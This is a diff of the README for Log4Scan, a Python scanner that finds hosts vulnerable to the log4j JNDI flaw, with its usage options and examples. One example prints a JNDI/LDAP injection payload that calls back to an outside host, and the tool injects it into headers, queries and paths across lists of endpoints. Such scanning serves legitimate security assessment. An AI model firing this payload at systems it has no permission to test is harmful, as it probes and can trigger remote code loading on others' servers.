@@ -1,12 +1,67 @@
+# Log4Scan
+### A simple automatic tool for finding vulnerable log4j hosts
 ## Installation
-```
-pip3 install -r requirements
+```shell
+pip3 install -r requirements.txt
 ```
 ## Usage
-```python3 main.py input.txt```
+```
+usage: log4scan.py [-h] (-f FILENAME | -e ENDPOINT) [--http] [--https] [-p PAYLOAD] [--host HOST] [-o OUTPUT_FILE] [-m MAPPING_FILE] [-t TIMEOUT] [-v]
+                   [--headers-file HEADERS] [--manual] [--proxy PROXY] [--token INTERACT_TOKEN] [--headers] [--query] [--path]
 
-The input file is a list of entries in the form IP:PORT, one for row. Both HTTP and HTTPS will be tested for each endpoint.
-A CSV file mapping the randomly generated ID with the corresponding endpoint will be generated as `ids.csv`.
+options:
+  -h, --help            show this help message and exit
+  -f FILENAME, --filename FILENAME
+                        file to use as a source of endpoints (format IP:PORT)
+  -e ENDPOINT, --endpoint ENDPOINT
+                        endpoint to test
+  --http                Test HTTP on domains without explicit schema
+  --https               Test HTTPS on domains without explicit schema
+  -p PAYLOAD, --payload PAYLOAD
+                        template of the testing payload to use
+  --host HOST           host to send LDAP request [default: interactsh.com]
+  -o OUTPUT_FILE, --output OUTPUT_FILE
+                        output file with vulnerable hosts
+  -m MAPPING_FILE, --mappings MAPPING_FILE
+                        output file with ID<->Endpoint mapping
+  -t TIMEOUT, --timeout TIMEOUT
+                        request timeout [default: 10]
+  -v, --verbose         verbose logging
+  --headers-file HEADERS
+                        file with a list of header to test
+  --manual              do not run automatic verification and use the simple payload instead
+  --proxy PROXY         send requests through proxy
+  --token INTERACT_TOKEN
+                        Custom interact.sh token
 
-## Settings
-Some settings can be changed in the main.py constants
+Tests:
+  [default: Headers, Query, Path]
+
+  --headers             test headers injection like user-agent and referer
+  --query               test query injection in GET request as id parameter
+  --path                test path injection
+```
+### Basic Usage
+Automatically test a single endpoint
+```shell
+python3 log4scan.py -e http://vulnerablemachine.com
+```
+Automatically test multiple endpoints defined in a file
+```shell
+python3 log4scan.py -f ./hosts.txt
+```
+Manually test multiple endpoints defined in a file with custom payload and private host
+```shell
+python3 log4scan.py -f ./hosts.txt --manual --payload '${jndi:ldap://HOST/customprefix-ID}' --host privatehost.net
+```
+Automatically test multiple endpoints defined in a file and generate two files containing the mappings between ID and endpoints and the vulnerable endpoints
+```shell
+python3 log4scan.py -f ./hosts.txt -m ./mapping.csv -o ./vulnerable-endpoints.txt
+```
+
+## License
+This project is licensed under **MIT License**
+
+## Authors:
+- Federico Rapetti
+- Reply Communication Valley: https://www.linkedin.com/company/communication-valley
